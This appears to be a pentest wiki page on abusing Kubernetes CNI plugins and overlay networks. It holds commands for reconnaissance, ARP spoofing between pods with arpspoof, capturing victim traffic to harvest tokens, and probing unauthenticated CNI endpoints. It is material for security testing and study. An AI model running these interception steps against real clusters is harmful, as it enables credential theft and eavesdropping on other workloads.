---
title: "CNI and overlay abuse: weaknesses in the pod-network implementation"
description: "The CNI plugin and its overlay (VXLAN, IP-in-IP, or eBPF datapath) implement pod networking, and their behaviour can be abused: ARP and overlay spoofing on the pod network for man-in-the-middle, reaching the CNI's own management interfaces, and exploiting datapath configurations that fail to isolate or that trust pod-supplied addressing."
keywords:
  - cni
  - overlay network
  - vxlan
  - arp spoofing
  - eBPF datapath
---

# CNI and overlay abuse

Pod networking is implemented by a CNI plugin (Calico, Flannel, Cilium, Weave, and others), usually over an overlay such as VXLAN or IP-in-IP, or an eBPF datapath. That implementation is an attack surface. On a shared layer-2 or overlay segment an attacker performs ARP or overlay spoofing to man-in-the-middle traffic between pods; the CNI's own agents and management interfaces may be reachable; and some datapaths trust pod-supplied addressing or fail to isolate certain traffic, which lets a pod impersonate another or escape the intended segmentation.

Identify the CNI and the segment:

```bash
kubectl get pods -n kube-system -o wide | grep -iE 'calico|flannel|cilium|weave|canal'
ip -4 addr; ip route; ip neigh                          # overlay interface and neighbours
cat /etc/cni/net.d/* 2>/dev/null                        # CNI config, if reachable on a node
```

## Routes

```bash
# ARP spoofing on a shared pod segment for man-in-the-middle (needs CAP_NET_RAW,
# which is in the default set) - identical to the container network-raw technique
sysctl -w net.ipv4.ip_forward=1 2>/dev/null
arpspoof -i eth0 -t <victim-pod-ip> <gateway-ip> &
tcpdump -i eth0 -w loot.pcap host <victim-pod-ip>
# reach a CNI agent's API/metrics if exposed on the node or pod network
curl -s http://<node>:9099/ 2>/dev/null                 # example CNI health/metrics port
```

## Exploitation notes

- ARP/overlay spoofing is the most portable abuse because `CAP_NET_RAW` is in the default container capability set; it intercepts intra-segment pod traffic to harvest tokens and credentials in transit, matching the runtime-agnostic [CAP_NET_RAW](../../../container-escape/privileged-configuration/capability-abuse/cap-net-raw.md) technique.
- CNI agents sometimes expose unauthenticated health, metrics, or management endpoints on the node network; these leak topology and occasionally allow configuration reads.
- Datapath-specific weaknesses (trusting pod-chosen source IPs, missing isolation on hairpin or node-origin traffic) are implementation and version dependent; fingerprint the CNI and test whether source-IP spoofing between pods is filtered.
- Encryption in the overlay (WireGuard or IPsec, offered by some CNIs) defeats passive interception; check whether it is enabled before relying on sniffing.

## References

- [CNI specification](https://github.com/containernetworking/cni/blob/main/SPEC.md)
- [Kubernetes: cluster networking](https://kubernetes.io/docs/concepts/cluster-administration/networking/)
- [HackTricks: network interception](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network)
